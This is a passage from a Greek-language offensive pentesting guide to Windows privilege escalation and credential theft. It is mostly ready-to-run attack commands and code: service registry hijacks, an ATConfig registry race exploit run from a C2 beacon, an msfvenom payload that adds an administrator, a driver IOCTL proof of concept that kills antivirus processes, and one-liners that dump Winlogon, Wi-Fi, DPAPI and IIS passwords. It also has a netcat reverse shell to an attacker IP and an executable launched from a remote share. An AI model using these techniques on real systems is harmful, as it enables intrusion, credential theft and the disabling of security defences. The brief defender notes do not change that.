Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης του μητρώου υπηρεσιών

Πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε οποιοδήποτε μητρώο υπηρεσιών.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας πάνω σε ένα **μητρώο υπηρεσιών** κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί εάν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Αν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να αλλαχθεί.

Για να αλλάξετε το Path του binary που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Ορισμένες λειτουργίες προσβασιμότητας των Windows δημιουργούν ανά-χρήστη **ATConfig** κλειδιά που στη συνέχεια αντιγράφονται από μια διεργασία **SYSTEM** σε ένα HKLM session key. Μια registry **symbolic link race** μπορεί να ανακατευθύνει αυτή την προνομιούχα εγγραφή σε **οποιοδήποτε HKLM path**, προσφέροντας primitive για arbitrary HKLM **value write**.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` περιέχει τις εγκατεστημένες λειτουργίες προσβασιμότητας.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει ρυθμίσεις που ελέγχονται από τον χρήστη.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τις μεταβάσεις σύνδεσης/secure-desktop και είναι εγγράψιμο από τον χρήστη.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Γεμίστε την τιμή **HKCU ATConfig** που θέλετε να γραφτεί από τη **SYSTEM**.
2. Προκαλέστε την αντιγραφή στο secure-desktop (π.χ., **LockWorkstation**), που ξεκινά τη ροή του AT broker.
3. Κερδίστε τον αγώνα τοποθετώντας ένα oplock στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; όταν ενεργοποιηθεί το oplock, αντικαταστήστε το κλειδί **HKLM Session ATConfig** με ένα **registry link** προς έναν προστατευμένο HKLM στόχο.
4. Η SYSTEM γράφει την τιμή που επέλεξε ο επιτιθέμενος στο ανακατευθυνόμενο HKLM path.

Μόλις έχετε arbitrary HKLM value write, μεταβείτε σε LPE αντικαθιστώντας τιμές ρύθμισης υπηρεσίας:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που ένας κανονικός χρήστης μπορεί να ξεκινήσει (π.χ., **`msiserver`**) και ενεργοποιήστε την μετά τη write. **Σημείωση:** η δημόσια υλοποίηση του exploit **κλειδώνει το workstation** ως μέρος του αγώνα.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Εάν έχετε αυτό το δικαίωμα σε ένα registry, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υπο-registries από αυτό**. Στην περίπτωση των Windows services, αυτό είναι **αρκετό για να εκτελεστεί αυθαίρετος κώδικας:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν η διαδρομή προς ένα εκτελέσιμο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Καταγράψτε όλες τις unquoted service paths, εξαιρουμένων αυτών που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτή την ευπάθεια με metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα service binary με metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες Ανάκτησης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα εκτελεστούν αν μια υπηρεσία αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, μπορεί να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **δικαιώματα των binaries** (ίσως μπορείτε να αντικαταστήσετε ένα και να escalate privileges) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο δυαδικό αρχείο που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος να βρείτε αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι ο εξής:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Το Notepad++ φορτώνει αυτόματα οποιοδήποτε plugin DLL μέσα στους υποφακέλους `plugins`. Εάν υπάρχει εγγράψιμη portable/copy install, η τοποθέτηση ενός κακόβουλου plugin δίνει αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένων των `DllMain` και plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση στην εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα για ενδιαφέρουσες **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Αν ένας driver εκθέτει ένα arbitrary kernel read/write primitive (συχνό σε poorly designed IOCTL handlers), μπορείς να αυξήσεις τα προνόμια κλέβοντας ένα SYSTEM token απευθείας από τη μνήμη του kernel. Δες την βήμα‑βήμα τεχνική εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για race-condition bugs όπου η ευάλωτη κλήση ανοίγει ένα attacker-controlled Object Manager path, η σκόπιμη επιβράδυνση του lookup (χρησιμοποιώντας max-length components ή deep directory chains) μπορεί να μεγαλώσει το παράθυρο από microseconds σε δεκάδες microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Οι σύγχρονες hive ευπάθειες επιτρέπουν την προετοιμασία deterministic layouts, την εκμετάλλευση writable HKLM/HKU descendants, και τη μετατροπή του metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθε ολόκληρη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Κάποιοι signed third‑party drivers δημιουργούν το device object τους με ένα ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να θέσουν FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτή τη σημαία, το secure DACL δεν επιβάλλεται όταν το device ανοίγεται μέσω ενός path που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε unprivileged user να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματική περίπτωση)

Μόλις ένας χρήστης μπορεί να ανοίξει το device, privileged IOCTLs που εκθέτει ο driver μπορούν να καταχραστούν για LPE και tampering. Παραδείγματα δυνατοτήτων που παρατηρήθηκαν στην πράξη:
- Επιστροφή full-access handles σε arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Τερματισμός arbitrary processes, συμπεριλαμβανομένων Protected Process/Light (PP/PPL), επιτρέποντας AV/EDR kill από user land μέσω kernel.

Ελάχιστο PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Μέτρα μετριασμού για προγραμματιστές
- Ορίστε πάντα FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε device objects που προορίζονται να περιοριστούν από έναν DACL.
- Επαληθεύστε το περιβάλλον καλούντος για privileged operations. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασίας ή την επιστροφή handles.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε brokered models αντί για direct kernel privileges.

Ιδέες ανίχνευσης για τους αμυνόμενους
- Παρακολουθήστε τα user-mode ανοίγματα ύποπτων ονομάτων συσκευών (π.χ., \\ .\\amsdk*) και συγκεκριμένες IOCTL ακολουθίες που υποδηλώνουν κατάχρηση.
- Επιβάλλετε το vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και διατηρείτε δικούς σας allow/deny lists.


## PATH DLL Hijacking

Εάν έχετε **write permissions inside a folder present on PATH** μπορείτε να hijack a DLL που φορτώνεται από μια διεργασία και να **escalate privileges**.

Ελέγξτε τα δικαιώματα όλων των φακέλων που βρίσκονται στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτόν τον έλεγχο:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Δίκτυο

### Κοινόχρηστοι φάκελοι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### αρχείο hosts

Ελέγξτε για άλλους γνωστούς υπολογιστές που είναι στατικά καταχωρημένοι στο αρχείο hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερα[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το δυαδικό αρχείο `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Εάν αποκτήσετε τον χρήστη root, μπορείτε να ακούσετε σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσετε το `nc.exe` για να ακούσετε σε μια θύρα, θα ρωτήσει μέσω GUI αν το `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το `WSL` σύστημα αρχείων στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Διαπιστευτήρια

### Winlogon Διαπιστευτήρια
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Διαχείριση διαπιστευτηρίων / Windows vault

Από [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για διακομιστές, ιστοσελίδες και άλλα προγράμματα τα οποία το **Windows** μπορεί να **συνδέει αυτόματα τους χρήστες**. Σε πρώτη ανάγνωση μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύουν τα διαπιστευτήριά τους για Facebook, Twitter, Gmail κ.λπ., ώστε να συνδέονται αυτόματα μέσω προγραμμάτων περιήγησης. Όμως δεν είναι έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια που το Windows μπορεί να χρησιμοποιήσει για να συνδέει αυτόματα τους χρήστες, πράγμα που σημαίνει ότι οποιαδήποτε **Windows εφαρμογή που χρειάζεται διαπιστευτήρια για πρόσβαση σε έναν πόρο** (διακομιστής ή ιστοσελίδα) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** και το Windows Vault και να χρησιμοποιήσει τα αποθηκευμένα διαπιστευτήρια αντί οι χρήστες να πληκτρολογούν συνέχεια όνομα χρήστη και κωδικό.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν πιστεύω ότι είναι δυνατόν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Έτσι, αν η εφαρμογή σας θέλει να αξιοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με τον credential manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο αποθηκευτικό vault.

Χρησιμοποιήστε το `cmdkey` για να απαριθμήσετε τα αποθηκευμένα διαπιστευτήρια στη μηχανή.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` προκειμένου να χρησιμοποιήσετε τα αποθηκευμένα credentials. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρησιμοποιώντας το `runas` με ένα παρεχόμενο σύνολο credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ή από [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Η **Data Protection API (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, κυρίως χρησιμοποιούμενη στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή του συστήματος που συμβάλλει σημαντικά στην εντροπία.

**DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προέρχεται από τα μυστικά σύνδεσης του χρήστη**. Σε περιπτώσεις κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά αυθεντικοποίησης domain του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, μέσω DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου `{SID}` αντιπροσωπεύει τον χρήστη [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Το DPAPI key, που βρίσκεται μαζί με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την εμφάνιση του περιεχομένου του μέσω της εντολής `dir` στο CMD, παρόλο που μπορεί να εμφανιστεί μέσω PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τις κατάλληλες παραμέτρους (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files protected by the master password** συνήθως βρίσκονται στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να το αποκρυπτογραφήσετε.\

Μπορείτε να **εξάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το `sekurlsa::dpapi` module (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Διαπιστευτήρια

**PowerShell credentials** χρησιμοποιούνται συχνά για εργασίες **scripting** και αυτοματισμού ως τρόπος αποθήκευσης κρυπτογραφημένων credentials με άνεση. Τα credentials προστατεύονται με **DPAPI**, που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **αποκρυπτογραφήσετε** ένα PS credentials από το αρχείο που το περιέχει, μπορείτε να κάνετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατα Εκτελεσμένες Εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Μπορείτε να **εξάγετε πολλούς DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Συχνά οι χρήστες χρησιμοποιούν την εφαρμογή StickyNotes σε Windows workstations για να **αποθηκεύουν κωδικούς πρόσβασης** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι είναι αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητείτε και να το εξετάζετε.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε κωδικούς από AppCmd.exe χρειάζεται να είστε Administrator και να τρέχετε σε High Integrity level.**\
**AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\  
Εάν αυτό το αρχείο υπάρχει τότε είναι πιθανό ότι κάποιες **credentials** έχουν διαμορφωθεί και μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι εγκαταστάτες **εκτελούνται με SYSTEM privileges**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Μητρώο (Διαπιστευτήρια)

### Putty Διαπιστευτήρια
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys στο registry

Τα SSH ιδιωτικά κλειδιά μπορούν να αποθηκευτούν μέσα στο registry key `HKCU\Software\OpenSSH\Agent\Keys`, οπότε θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
